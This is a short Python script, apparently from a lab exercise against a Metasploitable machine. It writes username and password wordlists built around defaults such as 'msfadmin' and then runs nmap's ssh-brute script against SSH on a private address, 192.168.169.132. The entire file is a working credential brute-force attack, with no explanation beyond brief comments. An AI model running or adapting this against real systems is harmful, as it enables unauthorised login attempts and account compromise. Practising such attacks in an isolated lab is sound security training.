import os
import subprocess

def userlist():

    # This function gernerates a potential list of usernames

    f = open('username.txt', 'w')
    f.write(str('admin\n'))
    f.write(str("Admin\n"))
    f.write(str("Admin1\n"))
    f.write(str("msfadmin\n"))
    f.write(str("mtt\n"))
    f.write(str('msffadmin\n'))
    f.write(str("MSFadmin\n"))
    f.write(str("Administraitor\n"))
    f.write(str("msadmin\n"))
    f.write(str('mfaadmin\n'))
    f.write(str("Admin123\n"))
    f.write(str("Metasplitable\n"))
    f.write(str("msfadmin\n"))
    f.write(str('Geralds\n'))
    f.write(str("Admin!\n"))
    f.write(str("kali\n"))
    f.write(str("msfadmi12n\n"))

    f.close()

def passlist():
   
    # This function generates a list of potential passwords

    a = open('password.txt', 'w')
   
    a.write(str('msfADMIN\n'))
    a.write(str('Password\n'))
    a.write(str("Admin\n"))
    a.write(str("P@ssword!\n"))
    a.write(str("msfadmin\n"))
    a.write(str("wordpass\n"))
    a.write(str('msffadmin\n'))
    a.write(str("MSFadmin\n"))
    a.write(str("P@ss\n"))
    a.write(str("msadmin\n"))
    a.write(str('Pssword\n'))
    a.write(str("Admin123\n"))
    a.write(str("P@ssword!!!!!!!\n"))
    a.write(str("msfadmin\n"))
    a.write(str('Passwordds\n'))
    a.write(str("Admin!\n"))
    a.write(str("P@sswo2rd!\n"))
    a.write(str("msfadmi12n\n"))

    a.close()

def bruteforce():

    # This function leverates the namp bruteforce scripts and adds out pass and username lists to target the host

   
    cmd = ['nmap', '--script', 'ssh-brute',  '-p22', '192.168.169.132', '--script-args', 'userdb=username.txt,passdb=password.txt']

   
    return subprocess.call(cmd)

   

userlist()
passlist()
bruteforce()

print (bruteforce)

